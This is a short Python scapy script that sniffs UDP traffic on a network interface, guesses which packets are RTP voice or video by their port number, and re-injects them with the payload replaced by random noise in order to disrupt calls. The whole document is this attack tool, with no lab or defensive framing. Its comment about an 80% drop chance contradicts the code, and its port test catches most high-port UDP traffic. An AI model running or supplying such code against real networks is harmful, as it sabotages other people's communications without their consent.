from scapy.all import *
import random

INTERFACE = "enp7s0"  
KNOWN_RTP_PORTS = set()  # Store dynamically detected RTP ports

def detect_rtp(packet):
    """ Identify RTP packets dynamically and modify them """
    global KNOWN_RTP_PORTS
    
    if packet.haslayer(UDP) and packet.haslayer(Raw):
        udp_sport = packet[UDP].sport
        udp_dport = packet[UDP].dport

        # RTP ports are usually high (16384-32767 in WebRTC/VoIP)
        if 16384 <= udp_sport <= 65535 or 16384 <= udp_dport <= 65535:
            KNOWN_RTP_PORTS.add(udp_sport)
            KNOWN_RTP_PORTS.add(udp_dport)

            print(f"Detected RTP on port {udp_sport} or {udp_dport}")

            modify_packet(packet)

def modify_packet(packet):
    """ Modify or drop RTP packets """
    if packet.haslayer(UDP) and (packet[UDP].sport in KNOWN_RTP_PORTS or packet[UDP].dport in KNOWN_RTP_PORTS):
        print(f"Intercepted RTP packet from {packet[IP].src} to {packet[IP].dst}")

        # 80% chance to drop
        if random.random() < 0.5:
            print("Doing nothing!")
            return  

        if packet.haslayer(Raw):
            noise = bytes(random.getrandbits(8) for _ in range(len(packet[Raw].load)))
            packet[Raw].load = noise
            print("RTP payload corrupted with random noise.")

        # Recalculate checksum
        del packet[IP].chksum
        del packet[UDP].chksum
        packet = packet.__class__(bytes(packet))  

        sendp(packet, iface=INTERFACE, verbose=True)
        print("Modified packet sent.")

print(f"Sniffing UDP packets on {INTERFACE} to detect RTP traffic...")
sniff(iface=INTERFACE, filter="udp", prn=detect_rtp, store=0)
